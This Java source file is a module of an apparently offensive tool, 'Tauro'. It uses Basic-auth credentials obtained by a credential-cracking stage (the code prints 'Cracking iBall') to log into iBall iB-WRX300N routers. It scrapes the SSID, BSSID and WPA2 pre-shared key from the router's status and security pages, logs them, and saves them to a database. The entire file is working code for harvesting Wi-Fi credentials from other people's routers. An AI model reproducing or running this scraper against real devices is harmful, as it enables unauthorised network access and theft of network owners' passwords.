/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.koreops.tauro.cli.scraper.basicauth;

import org.jsoup.HttpStatusException;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.koreops.net.def.beans.AuthCrackParams;
import org.koreops.tauro.cli.authtrial.threads.DefaultAuthTrial;
import org.koreops.tauro.cli.dao.UpdaterDao;
import org.koreops.tauro.cli.scraper.AbstractScrapperAndSaver;
import org.koreops.tauro.core.loggers.Logger;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.Level;

/**
 * Scraper module for iBall - iB-WRX300N.
 *
 * @author Sudipto Sarkar (k0r0pt) (sudiptosarkar@visioplanet.org).
 * @since 24 Oct, 2017 10:56 PM
 */
public class IBallWrx300NScraper extends AbstractScrapperAndSaver {

  public IBallWrx300NScraper(String host, String hostUrl, AuthCrackParams params, UpdaterDao updaterDao) {
    super(host, hostUrl, params, updaterDao);
  }

  @Override
  public boolean scrapeAndLog() {
    return this.logIBallBatonWirelessStation(hostUrl, base64Login);
  }

  /**
   * Logs the iBall Baton's Wireless Station.
   *
   * @param base64Login This is for iBall Baton's Router - iB-WRX300N
   */
  private boolean logIBallBatonWirelessStation(String hostUrl, String base64Login) {
    try {
      System.out.println("Cracking iBall");
      String macAddr = null;
      String ssid = null;
      Document doc = Jsoup.connect(hostUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();
      if (!iballWrx300NTitles.contains(doc.title())) {
        Logger.debug(host + ": Not an iBall iB-WRX300N router.");
        return false;
      }

      String devInfoUrl = hostUrl + "userRpm/StatusRpm.htm";

      doc = Jsoup.connect(devInfoUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      Elements data = doc.select("script");

      for (Element datum : data) {
        if (datum.data().contains("var wlanPara = new Array(")) {
          String theScript = datum.data();
          String[] scriptLines = theScript.split("\n");
          int i = 0;
          for (String line : scriptLines) {
            if ("var wlanPara = new Array(".equals(line)) {
              // This is the first line anyway.
              i = 0;
            }
            if (i == 2) {
              ssid = line.substring(1, line.length() - 2);
              Logger.debug(host + ": Found SSID: " + ssid);
            }
            if (i == 5) {
              macAddr = line.substring(1, line.length() - 2);
              macAddr = macAddr.replace("-", ":");
              Logger.debug(host + ": Found Mac: " + macAddr);
            }
            i++;
          }
        }
      }

      if (macAddr == null) {
        Logger.error(host + ": does not have Wireless (not on the modem at least).");
        return false;
      }

      Logger.debug(host + ": Found MAC: " + macAddr);

      Map<String, String> wifiData = getIBallWirelessData(hostUrl, base64Login);
      if (wifiData == null) {
        return false;
      }
      wifiData.put("BSSID", macAddr.toLowerCase());
      wifiData.put("SSID", ssid);

      updaterDao.saveStation(wifiData, host);
      return true;
    } catch (HttpStatusException ex) {
      if ((ex.getStatusCode() != 404) && (ex.getStatusCode() != 501)) {
        Logger.error(host + ": HttpStatusException during logWirelessStation() " + ex.getMessage() + " ::::::: " + ex.toString());
      }
    } catch (IOException ex) {
      Logger.error(host + ": IOException during logWirelessStation(): " + ex.getMessage() + " ::::::: " + ex.getLocalizedMessage());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    } catch (Exception ex) {
      Logger.error(host + ": Exception during logWirelessStation(): " + ex.getMessage() + " ::::::: " + ex.getLocalizedMessage());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    }
    return false;
  }

  private Map<String,String> getIBallWirelessData(String hostUrl, String base64Login) {
    Map<String, String> wifiData = null;

    String wifiSecUrl = hostUrl + "userRpm/WlanSecurityRpm.htm";
    try {
      Document doc = Jsoup.connect(wifiSecUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      Elements data = doc.select("script");

      for (Element datum : data) {
        if (datum.data().contains("var wlanPara = new Array(")) {
          String[] lines = datum.data().split("\n");
          int i = 0;
          for (String line : lines) {
            if (i == 2) {
              //3nd line is where the array is declared. First line is just \n, so empty string after split.
              String[] arrayElements = line.split(",");
              Logger.debug(arrayElements[4], true);
              // If we're still here, we're good.
              String key = arrayElements[9];
              String authType = "WPA2";
              String encryption;
              key = key.trim().substring(key.indexOf("\""), key.lastIndexOf("\"") - 1); // To get rid of the quotes.
              Logger.debug(host + ": Found key: " + key);
              if ("3".equals(arrayElements[14].trim())) {
                encryption = "AES";
              } else if ("2".equals(arrayElements[14].trim())) {
                encryption = "TKIP";
              } else {
                encryption = "";
              }
              Logger.debug(host + ": Found AuthType: " + authType);
              Logger.debug(host + ": Found Encryption: " + encryption);

              wifiData = new HashMap<>();
              wifiData.put("Encryption", encryption);
              wifiData.put("AuthType", authType);
              wifiData.put("key", key);
            }
            i++;
          }
        }
      }
    } catch (HttpStatusException ex) {
      if (ex.getStatusCode() != 404) {
        Logger.error(host + ": HttpStatusException during getWirelessData() " + ex.getMessage() + " ::::::: " + ex.toString());
      }
    } catch (IOException ex) {
      Logger.error(host + ": IOException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    } catch (Exception ex) {
      Logger.error(host + ": Exception during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    }
    return wifiData;
  }
}
